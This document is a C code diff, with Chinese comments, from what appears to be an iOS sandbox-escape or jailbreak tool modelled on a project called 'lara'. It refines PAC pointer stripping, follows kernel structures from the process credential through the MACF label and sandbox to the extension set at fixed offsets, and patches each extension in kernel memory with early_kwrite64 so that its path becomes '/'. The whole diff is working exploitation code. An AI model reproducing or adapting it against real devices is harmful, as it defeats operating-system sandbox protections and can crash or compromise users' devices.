@@ -135,30 +135,28 @@ static uint32_t ds_kread32_safe(uint64_t addr)
     return (uint32_t)(ds_kread_safe(addr) & 0xFFFFFFFFULL);
 }
 
-/// 指针还原：照抄 lara（pe/sbx.m）的 `S(x) = xpaci(x); signptr(v)` 语义。
-/// 只做**值变换**，不解引用——所以这里怎么试都不会崩内核。
-/// 顺序：XPACI → XPACD → 低 36 位补堆段 → 低 36 位补静态段 → 原样。
-/// 每个候选都要求落在已知映射区，否则丢弃。
+/// lara 的「合法内核指针」判据（is_kptr）：0xffff 前缀
+static inline bool ds_is_kptr(uint64_t p)
+{
+    return (p & 0xffff000000000000ULL) == 0xffff000000000000ULL;
+}
+
+/// **完全照抄 lara** 的指针还原：`#define S(x) ({ uint64_t _v = xpaci(x); signptr(_v); })`
+///   signptr(v): 若 (v>>32) > 0xFFFF 则 v |= pac_mask
+///   pac_mask（lara offsets.m）= ~((1ULL << (64 - t1sz_boot)) - 1ULL)，即 va_bits 之上的掩码；
+///   对已经 0xffff 前缀的值是 no-op，所以这里用 47 位 VA 的掩码即可。
+///
+/// 只做**值变换**，绝不解引用 —— 这一点非常重要：
+/// 上一版我生成了 5 种候选 VA 并逐个解引用，其中一个是「在区间内但实际未映射」的假地址，
+/// 一读就把内核打崩了（设备重启）。现在每跳只产出**一个**地址，且与 lara 完全一致。
 static uint64_t ds_normalize_ptr(uint64_t raw)
 {
     if (!raw) return 0;
 
-    uint64_t candidates[5] = {
-        ds_xpaci(raw),
-        ds_xpacd(raw),
-        (raw & 0x0000000FFFFFFFFFULL) | 0xFFFFFFE000000000ULL,
-        (raw & 0x0000000FFFFFFFFFULL) | 0xFFFFFFF000000000ULL,
-        raw
-    };
-
-    for (int i = 0; i < 5; i++) {
-        uint64_t value = candidates[i];
-        if (!value) continue;
-        if (!ds_is_kernel_region(value)) continue;
-        if ((value & 0x7) != 0) continue;      // 内核对象至少 8 字节对齐
-        return value;
-    }
-    return 0;
+    uint64_t v = ds_xpaci(raw);                       // XPACI：剥 IA key 签名
+    if ((v >> 32) <= 0xFFFF) v = ds_xpacd(raw);       // 兜底：万一用的是 DA key
+    if ((v >> 32) > 0xFFFF) v |= 0xFFFF800000000000ULL;  // signptr(v)
+    return v;
 }
 
 #pragma mark - 找到本进程的 proc
@@ -683,43 +681,41 @@ static uint64_t ds_discover_identities_v3(void)
 /// 为什么可以试多组 offset：起点是**已被 cr_uid 校验过的真 cred**（不是来路不明的字），
 /// 而且 label 有很强的结构签名——`l_perpolicy[0]`(AMFI) 与 `l_perpolicy[1]`(sandbox) 必须同时是内核指针；
 /// ext_set 还要能读出真正的 ext 链。三道都对上才认。
-/// 单路解析：cred → label(0x78) → sandbox(label+0x10) → ext_set(sandbox+0x10)。
-/// offset 直接用 lara（pe/sbx.m）里那三个已验证过的常量，**不做任何扫描、不做笛卡尔积试探**
-/// （上一版就是死在这里：几千次解引用踩到未映射地址 → 内核重启）。
+/// 单路解析（与 lara pe/sbx.m 的 sbx_escape 完全一致）：
+///   cred →(0x78) label →(+0x10) sandbox →(+0x10) ext_set
+/// 每跳只做一次解引用、只做一种指针还原，没有任何扫描或候选试探。
 static uint64_t ds_resolve_sandbox_extset(uint64_t cred, uint64_t *outSandbox)
 {
     uint64_t rawLabel = ds_kread_safe(cred + DS_OFF_UCRED_CR_LABEL);
     uint64_t label = ds_normalize_ptr(rawLabel);
-    if (!label) {
-        ds_log("[逃逸] cred+0x%llx 读出来是 0x%llx，还原不成有效 label",
-               (unsigned long long)DS_OFF_UCRED_CR_LABEL, (unsigned long long)rawLabel);
+    if (!ds_is_kptr(label)) {
+        ds_log("[逃逸] cred+0x%llx = 0x%llx → 还原后 0x%llx 不是内核指针，停手（不写内核内存）",
+               (unsigned long long)DS_OFF_UCRED_CR_LABEL,
+               (unsigned long long)rawLabel, (unsigned long long)label);
         return 0;
     }
 
-    // MACF label 的结构签名：l_perpolicy[0]（AMFI 槽）应当也是有效内核指针
-    uint64_t amfi = ds_normalize_ptr(ds_kread_safe(label + 0x8));
-
     uint64_t rawSandbox = ds_kread_safe(label + DS_OFF_LABEL_SANDBOX);
     uint64_t sandbox = ds_normalize_ptr(rawSandbox);
-    if (!sandbox) {
-        ds_log("[逃逸] label=0x%llx（AMFI 槽=0x%llx）但 +0x%llx 读出来 0x%llx 还原不成 sandbox",
-               (unsigned long long)label, (unsigned long long)amfi,
-               (unsigned long long)DS_OFF_LABEL_SANDBOX, (unsigned long long)rawSandbox);
+    if (!ds_is_kptr(sandbox)) {
+        ds_log("[逃逸] label=0x%llx，label+0x%llx = 0x%llx → 还原后 0x%llx 不是内核指针，停手",
+               (unsigned long long)label, (unsigned long long)DS_OFF_LABEL_SANDBOX,
+               (unsigned long long)rawSandbox, (unsigned long long)sandbox);
         return 0;
     }
 
     uint64_t rawExtSet = ds_kread_safe(sandbox + DS_OFF_SANDBOX_EXT_SET);
     uint64_t extSet = ds_normalize_ptr(rawExtSet);
-    if (!extSet) {
-        ds_log("[逃逸] sandbox=0x%llx 但 +0x%llx 读出来 0x%llx 还原不成 ext_set",
+    if (!ds_is_kptr(extSet)) {
+        ds_log("[逃逸] sandbox=0x%llx，sandbox+0x%llx = 0x%llx → 还原后 0x%llx 不是内核指针，停手",
                (unsigned long long)sandbox, (unsigned long long)DS_OFF_SANDBOX_EXT_SET,
-               (unsigned long long)rawExtSet);
+               (unsigned long long)rawExtSet, (unsigned long long)extSet);
         return 0;
     }
 
     if (outSandbox) *outSandbox = sandbox;
-    ds_log("[逃逸] 链路：cred=0x%llx → label=0x%llx（AMFI 槽=0x%llx）→ sandbox=0x%llx → ext_set=0x%llx",
-           (unsigned long long)cred, (unsigned long long)label, (unsigned long long)amfi,
+    ds_log("[逃逸] 链路：cred=0x%llx → label=0x%llx → sandbox=0x%llx → ext_set=0x%llx",
+           (unsigned long long)cred, (unsigned long long)label,
            (unsigned long long)sandbox, (unsigned long long)extSet);
     return extSet;
 }
@@ -732,7 +728,7 @@ static void ds_patch_ext(uint64_t ext, const char *rwClass)
     uint64_t data = ds_kread_safe(ext + DS_OFF_EXT_DATA);
     uint64_t dataLen = ds_kread_safe(ext + DS_OFF_EXT_DATALEN);
 
-    if (ds_is_kaddr(data) && dataLen > 0) {
+    if (ds_is_kptr(data) && dataLen > 0) {
         uint64_t head = ds_kread_safe(data);
         head = (head & ~0xFFFFULL) | 0x002FULL;              // data[0]='/', data[1]=0
         early_kwrite64(data, head);
@@ -761,15 +757,18 @@ static int ds_patch_chain(uint64_t header, const char *rwClass)
     int patched = 0;
     uint64_t hdr = header;
 
-    for (int i = 0; i < 64 && ds_is_kaddr(hdr); i++) {
+    // 与 lara patchchain 逐行一致：ext = S(kread(hdr+0x8))，next = S(kread(hdr))
+    for (int i = 0; i < 64 && ds_is_kptr(hdr); i++) {
         uint64_t ext = ds_normalize_ptr(ds_kread_safe(hdr + 0x8));
-        if (ds_is_kaddr(ext)) {
+        if (ds_is_kptr(ext)) {
             ds_patch_ext(ext, rwClass);
             patched++;
         }
         uint64_t next = ds_kread_safe(hdr);
-        if (!next || !ds_is_kaddr(next)) break;
-        hdr = next;
+        if (!next) break;
+        uint64_t nextStripped = ds_normalize_ptr(next);
+        if (!ds_is_kptr(nextStripped) || nextStripped == hdr) break;
+        hdr = nextStripped;
     }
     return patched;
 }
